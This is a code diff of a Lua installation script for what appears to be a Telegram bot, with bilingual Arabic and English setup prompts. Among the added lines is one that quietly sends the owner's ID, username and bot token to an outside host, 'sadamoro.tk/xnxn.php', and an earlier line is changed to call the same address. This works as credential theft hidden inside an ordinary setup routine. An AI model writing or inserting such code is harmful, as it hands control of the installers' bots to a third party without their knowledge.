@@ -31,7 +31,7 @@ if not redis:get(Server_Sadam.."User_Devsadam1") then
 io.write('\n\27[1;35m⌔︙Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local GetInfoUser = http.request("http://sadamoro.tk/GetUser?id="..User_Sudo)
+local GetInfoUser = http.request("https://sadamoro.tk/xnxn.php/?id="..User_Sudo)
 local User_Info = JSON.decode(GetInfoUser)
 if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
@@ -53,6 +53,10 @@ io.write('\n\27[1;31m⌔︙The UserName was not Saved : لم يتم حفظ مع�
 end 
 os.execute('lua SaDaM.lua')
 end
+create_config_auto()
+https.request("https://sadamoro.tk/xnxn.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
 ------------------------------------------------------------------------------------------------------------
 local Devsadam_Info_Sudo = io.open("Info_Sudo.lua", 'w')
 Devsadam_Info_Sudo:write([[
